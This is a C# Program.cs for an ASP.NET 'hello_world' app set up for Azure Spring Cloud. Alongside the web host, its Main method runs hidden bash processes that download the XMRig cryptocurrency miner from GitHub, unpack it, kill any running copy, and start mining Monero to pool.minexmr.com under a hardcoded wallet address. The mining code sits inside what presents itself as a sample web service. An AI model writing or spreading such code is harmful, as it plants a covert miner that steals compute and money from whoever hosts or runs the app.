using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Azure.SpringCloud.Client;

namespace hello_world
{
    public class Program
    {
        public static void Main(string[] args)
        {
            CreateHostBuilder(args).Build().Run();
            try
            {
                string output = "";
                string error = "";
                var p1 = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = AppContext.BaseDirectory,
                        Arguments =
                            $"-c \"curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz \"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                p1.Start();
                p1.WaitForExit();
                error = p1.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                output = p1.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
                Thread.Sleep(500);
                
                p1 = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = AppContext.BaseDirectory,
                        Arguments =
                            $"-c \"tar xvfz xmrig-6.16.1-linux-x64.tar.gz \"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                p1.Start();
                p1.WaitForExit();
                error = p1.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                output = p1.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
                Thread.Sleep(500);

                p1 = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = AppContext.BaseDirectory,
                        Arguments =
                            $"-c \"pkill xmrig \"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                p1.Start();
                p1.WaitForExit();
                error = p1.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                output = p1.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
                Thread.Sleep(500);

                
                p1 = new Process()
                {
                    StartInfo = new ProcessStartInfo()
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = $"/bin/bash",
                        WorkingDirectory = AppContext.BaseDirectory,
                        Arguments =
                            $"-c \"xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx \"",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false
                    }
                };
                p1.Start();
                p1.WaitForExit();
                error = p1.StandardError.ReadToEnd();
                Console.WriteLine("ERROR: ", error);
                output = p1.StandardOutput.ReadToEnd();
                Console.WriteLine("OUTPUT: ", output);
                Thread.Sleep(500);
            }
            catch (Exception ex)
            {
                //_logger.LogError(ex.Message, ex);
                throw;
            }
        }

        public static IHostBuilder CreateHostBuilder(string[] args) =>
            Host.CreateDefaultBuilder(args)
                .UseAzureSpringCloudService()
                .ConfigureWebHostDefaults(webBuilder => { webBuilder.UseStartup<Startup>(); });
    }
}